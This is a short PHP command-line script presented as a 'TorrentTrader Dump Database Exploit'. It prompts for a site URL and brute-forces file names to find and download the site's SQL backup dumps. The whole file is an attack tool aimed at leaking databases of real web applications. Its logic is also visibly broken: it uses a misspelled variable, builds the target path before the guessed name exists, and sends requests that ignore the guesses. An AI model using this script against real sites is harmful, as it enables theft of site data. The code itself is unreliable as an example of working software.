<?php

	error_reporting (0);

	$db = "";
	
	function bf($width, $position, $base)
	{
		global $charset, $db;
	 
		foreach($charset as $char)
		{
			if ($position < $width - 1)
				bf($width, $position + 1, $base.chr($char));
				
			if (request($db = ($base.chr($char))) == true)
				return ($base.chr($char));
		}
	}
	
	function request ($pfile)
	{
		global $link;
		
		$sock = fsockopen($link, 80);
		
		if ($sock)
		{
			fputs ($sock,"GET / HTTP/1.1\r\nHost:$link\r\n\r\n");
			while (!feof($sock))
			{
				if (strstr(fgets($sock,124),"HTTP/1.1 404 Not Found"))
				{
					fclose ($sock);
					return false;
				}
				
				fclose ($sock);
				return true;
			}
		}
		
		return false;
	}
	
	print "\n\n[*] TorrentTrader Dump Database Exploit\n";
	print "URL : ";
	
	$url = trim(fgets(STDIN));
	
	if (!preg_match('#(https?:\/\/)#',$url))
		$url = 'http://'.$url;
	
	if (!preg_match('#(?:https?:\/\/)((w{3}\.)?([a-z0-9.-]+\.[a-z+]))#i',$url,$pout))
	{
		print "\n[*] URL invalide.\n";
		exit;
	}
	
	$link = $pout[1];
	
	if (!($page = file_get_contents($url)))
	{
		print "\n[*] URL invalide.\n";
		exit;
	}

	$today = getdate();
	$year = $today['year'];
	$day = $today['mday'];
	$month = $today['mon'];
	
	if ($day < 10)
		$day = "0$day";
		
	if ($month < 10)
		$month = "0$month";

	$charset = range(33, 126);

	$maxChars = 15;
	 
	$link = $url."backups/$db-$day-$month-$yeah.sql.gz";
	
	for($width = 1; $width < $maxChars+1; ++$width)
	{
		if (($ret = bf($width, 0, "")))
		{
			echo $ret;
			exit;
		}
	}
	
	
